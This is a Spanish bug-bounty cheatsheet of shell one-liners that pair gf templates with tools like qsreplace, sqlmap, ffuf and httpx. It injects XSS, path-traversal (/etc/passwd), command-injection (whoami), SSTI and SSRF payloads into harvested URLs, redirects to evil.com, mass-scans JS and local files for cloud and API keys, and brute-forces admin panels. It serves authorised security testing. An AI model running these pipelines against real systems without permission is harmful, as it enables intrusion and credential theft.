# GF Templates Cheatsheet

Referencia rapida para usar los templates GF en bug bounty.

## Comandos Basicos

```bash
gf -list                    # Listar todos los templates
gf -dump template-name      # Ver contenido de un template
gf -save name flags 'regex' # Crear nuevo template
cat file.txt | gf sqli      # Usar template
```

## Vulnerabilidades

### SQL Injection
```bash
cat urls.txt | gf sqli
cat urls.txt | gf sqli | qsreplace "'" | while read url; do curl -s "$url" | grep -i "sql"; done
cat urls.txt | gf sqli | sqlmap -m - --batch --random-agent
```

### XSS
```bash
cat urls.txt | gf xss
cat urls.txt | gf xss | qsreplace '"><script>alert(1)</script>'
cat urls.txt | gf xss | dalfox pipe
cat urls.txt | gf xss | qsreplace "FUZZ" | ffuf -w xss-payloads.txt -u FUZZ
```

### SSRF
```bash
cat urls.txt | gf ssrf
interactsh-client &
cat urls.txt | gf ssrf | qsreplace "http://YOUR-INTERACTSH.com"
cat urls.txt | gf ssrf | httpx -silent -fr -title
```

### LFI
```bash
cat urls.txt | gf lfi
cat urls.txt | gf lfi | qsreplace "../../../etc/passwd"
cat urls.txt | gf lfi | while read url; do curl -s "$url" | grep "root:"; done
```

### RCE
```bash
cat urls.txt | gf rce
cat urls.txt | gf rce | qsreplace "whoami"
cat urls.txt | gf rce | httpx -silent -mc 200
```

### SSTI
```bash
cat urls.txt | gf ssti
cat urls.txt | gf ssti | qsreplace "{{7*7}}"
cat urls.txt | gf ssti | tplmap -m - --batch
```

### XXE
```bash
cat urls.txt | gf xxe
cat urls.txt | gf xml-endpoints | gf xxe
```

### NoSQL Injection
```bash
cat urls.txt | gf nosqli
cat urls.txt | gf nosqli | qsreplace '{"$ne":""}'
```

## Autenticacion y Autorizacion

### JWT
```bash
cat responses.txt | gf jwt
cat responses.txt | gf jwt | while read jwt; do echo $jwt | jwt_tool -; done
```

### OAuth
```bash
cat urls.txt | gf oauth
cat urls.txt | gf oauth | grep "redirect_uri"
```

### IDOR
```bash
cat urls.txt | gf idor
cat urls.txt | gf idor | while read url; do echo $url | sed 's/[0-9]\+/FUZZ/g'; done
```

### Session
```bash
cat traffic.txt | gf session
cat responses.txt | gf session | grep -i "cookie"
```

## Logica y Negocio

### CORS
```bash
cat responses.txt | gf cors
cat urls.txt | httpx -silent -include-response | gf cors
```

### Open Redirect
```bash
cat urls.txt | gf redirect
cat urls.txt | gf redirect | qsreplace "https://evil.com"
```

### CSRF
```bash
cat urls.txt | gf csrf
cat forms.html | gf csrf
```

### Rate Limit
```bash
cat urls.txt | gf rate-limit
cat urls.txt | gf rate-limit | while read url; do for i in {1..100}; do curl -s "$url"; done; done
```

## Secretos y Credenciales

### AWS
```bash
cat files.txt | gf aws-keys
find . -type f | xargs cat | gf aws-keys
cat urls.txt | gf javascript-files | while read js; do curl -s "$js" | gf aws-keys; done
```

### GitHub
```bash
cat files.txt | gf github-tokens
cat *.js | gf github-tokens
```

### API Keys Genericas
```bash
cat responses.txt | gf api-keys
cat config.json | gf api-keys
cat .env | gf env-vars
```

### Multiples Secretos
```bash
# Escanear todos los secretos de cloud
cat files.txt | gf aws-keys | gf gcp-keys | gf azure-keys

# Escanear todos los SaaS
cat files.txt | gf github-tokens | gf slack-tokens | gf stripe-keys
```

## Reconocimiento

### Parametros Interesantes
```bash
cat urls.txt | gf interesting-params
cat urls.txt | gf sensitive-params
cat urls.txt | gf upload-params
```

### API Discovery
```bash
cat urls.txt | gf api-endpoints
cat wayback.txt | gf api-endpoints | httpx -mc 200
cat urls.txt | gf graphql
```

### Admin Panels
```bash
cat urls.txt | gf admin-panels
cat urls.txt | gf admin-panels | httpx -mc 200,401,403
```

### Archivos Sensibles
```bash
cat urls.txt | gf backup-files
cat urls.txt | gf config-files
cat wayback.txt | gf backup-files | httpx -mc 200
```

### Tecnologias
```bash
cat responses.txt | gf frameworks
cat urls.txt | gf javascript-files
cat urls.txt | gf cms-detection
```

## Encoding y Datos

### Base64
```bash
cat responses.txt | gf base64
cat responses.txt | gf base64 | base64 -d
```

### JWT
```bash
cat traffic.txt | gf jwt-tokens
cat traffic.txt | gf jwt-tokens | while read jwt; do echo $jwt | cut -d. -f2 | base64 -d; done
```

### JSON/XML
```bash
cat urls.txt | gf json-endpoints
cat urls.txt | gf xml-endpoints
```

## Pipelines Completos

### Pipeline XSS Completo
```bash
subfinder -d target.com -silent |
httpx -silent |
katana -silent |
gf xss |
qsreplace '"><script>alert(1)</script>' |
while read url; do
    response=$(curl -s "$url")
    echo "$response" | grep -q "alert(1)" && echo "[XSS] $url"
done
```

### Pipeline SQLi Completo
```bash
waybackurls target.com |
gf sqli |
qsreplace "FUZZ" |
ffuf -w sqli-payloads.txt -u FUZZ -mc 500
```

### Pipeline de Secretos
```bash
# JS Files
cat urls.txt |
gf javascript-files |
while read js_url; do
    curl -s "$js_url" |
    gf aws-keys |
    gf github-tokens |
    gf api-keys
done | tee secrets.txt
```

### Pipeline SSRF
```bash
interactsh-client &
INTERACTSH_URL=$(interactsh-client -n 1)

cat urls.txt |
gf ssrf |
qsreplace "http://$INTERACTSH_URL" |
xargs -I {} curl -s {} &

sleep 30
```

### Pipeline de Recon Completo
```bash
domain="target.com"

# Subdominios
subfinder -d $domain -silent | tee subs.txt
cat subs.txt | httpx -silent | tee live.txt

# URLs
cat live.txt | waybackurls | tee urls.txt
cat live.txt | katana -silent | tee -a urls.txt

# Analisis
cat urls.txt | gf interesting-params | tee params.txt
cat urls.txt | gf api-endpoints | tee apis.txt
cat urls.txt | gf admin-panels | tee admin.txt

# Vulnerabilidades
cat urls.txt | gf sqli | tee sqli.txt
cat urls.txt | gf xss | tee xss.txt
cat urls.txt | gf ssrf | tee ssrf.txt
```

## Combinaciones Utiles

### Multiples Vulnerabilidades
```bash
# Buscar varias vulns a la vez
cat urls.txt | gf sqli | gf xss | gf lfi | gf rce | sort -u

# Con colores diferentes
cat urls.txt | gf sqli | sed 's/^/[SQLi] /' &&
cat urls.txt | gf xss | sed 's/^/[XSS] /' &&
cat urls.txt | gf ssrf | sed 's/^/[SSRF] /'
```

### Con HTTPx
```bash
cat urls.txt | gf api-endpoints | httpx -silent -mc 200 -json | jq '.url'
cat urls.txt | gf admin-panels | httpx -silent -mc 200,401,403 -title
```

### Con Nuclei
```bash
cat urls.txt | gf sqli | nuclei -t ~/nuclei-templates/vulnerabilities/sqli/
cat urls.txt | gf xss | nuclei -t ~/nuclei-templates/vulnerabilities/xss/
```

### Con qsreplace
```bash
cat urls.txt | gf xss | qsreplace "FUZZ" | ffuf -u FUZZ -w payloads.txt
cat urls.txt | gf ssrf | qsreplace "http://burp-collab.com"
```

## Flags Utiles de grep

```bash
cat file.txt | gf -A 3 sqli    # 3 lineas despues
cat file.txt | gf -B 3 sqli    # 3 lineas antes
cat file.txt | gf -C 3 sqli    # 3 lineas antes y despues
```

## Organizacion de Resultados

```bash
# Crear estructura
mkdir -p results/{vuln,secrets,recon}

# Guardar resultados organizados
cat urls.txt | gf sqli > results/vuln/sqli.txt
cat urls.txt | gf xss > results/vuln/xss.txt
cat files.txt | gf aws-keys > results/secrets/aws.txt
cat urls.txt | gf api-endpoints > results/recon/apis.txt
```

## Automatizacion

### Script de Escaneo Rapido
```bash
#!/bin/bash
target=$1
cat $target |
gf sqli | gf xss | gf ssrf | gf lfi | gf rce |
sort -u |
tee all_vulns.txt
```

### Script de Secretos
```bash
#!/bin/bash
find . -type f -name "*.js" -o -name "*.json" -o -name "*.xml" |
while read file; do
    cat "$file" | gf aws-keys | gf github-tokens | gf api-keys
done | sort -u | tee secrets_found.txt
```

## Tips Rapidos

1. **Siempre usa `sort -u`** para eliminar duplicados
2. **Combina con `httpx`** para verificar respuestas
3. **Usa `tee`** para guardar mientras ves output
4. **Paraleliza con `xargs`** para mayor velocidad
5. **Valida siempre** los resultados manualmente
6. **Usa context flags** (-A, -B, -C) cuando necesites mas info
7. **Combina multiples templates** para mejor cobertura

## One-Liners Poderosos

```bash
# All-in-one recon
echo target.com | subfinder -silent | httpx -silent | waybackurls | gf sqli | gf xss | gf ssrf

# JS secrets mining
cat urls.txt | gf javascript-files | parallel -j 10 'curl -s {} | gf aws-keys | gf github-tokens'

# API fuzzing
cat urls.txt | gf api-endpoints | while read api; do for method in GET POST PUT DELETE; do echo "$method $api"; done; done

# Mass SQLi check
cat urls.txt | gf sqli | qsreplace "'" | parallel -j 50 'curl -s {} | grep -i "error\|warning\|mysql"'

# Admin panel bruteforce
cat urls.txt | gf admin-panels | cut -d/ -f1-3 | sort -u | ffuf -u "FUZZ/admin" -w -

# Complete secret scan
find . -type f | parallel -j 20 'cat {} | gf aws-keys | gf github-tokens | gf stripe-keys | gf api-keys'
```
